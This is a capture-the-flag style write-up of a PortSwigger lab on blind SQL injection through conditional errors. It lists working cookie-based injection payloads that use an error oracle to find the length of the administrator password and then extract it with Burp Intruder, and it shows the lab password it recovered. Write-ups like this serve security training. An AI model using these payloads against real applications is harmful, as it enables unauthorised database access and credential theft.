# Write-up: Blind SQL injection with conditional errors
Lab-Link: <https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors>  
Difficulty: PRACTITIONER  
 

## Lab description

![alt text](<img/1.png>)

## Steps

### Enumeration

We modify the TrackingId cookie to `8okDmnJXHtEDseY5'`, which gives us the response `Internal Server Error`.
If we add double quotes at the end of the cookie, we get the successful response. This means that their is a syntax error in the SQL query and we can use this to exploit with SQL injection.

We use the string concatenation to add a conditional error statement to the query.
`TrackingId=8okDmnJXHtEDseY5'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users)--`, this gives error `Internal Server Error` and `TrackingId=8okDmnJXHtEDseY5'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM users)--` gives no error. This means we get error response for true condition and no error for false condition.

### Exploitation

We will check the length of the password of the user `administrator` by using LENGTH function.
`TrackingId=8okDmnJXHtEDseY5'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE NULL END FROM users WHERE username='administrator')||'`. Using intruder we can set payload and grep match to `Internal Server Error` and check for the length of the password. Which comes out to be 20.

Now we will check the password of the user `administrator` by using the `SUBSTRING` function. 
`8okDmnJXHtEDseY5'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN to_char(1/0) ELSE NULL END FROM users WHERE username='administrator')||'`

We can automate this using Burpsuite Intruder. Here we set the payload to `§1§` and its type to numbers and from 1-20 and load the characters for 2nd payload to alphanumberic. We also set the Match grep in settings to `Internal Server Error` to get the response.

This gives us the password `g2paa7yjicr3ebq10z9c` and we can now login as administrator.

Hence, the lab is sovled.

![alt text](img/2.png)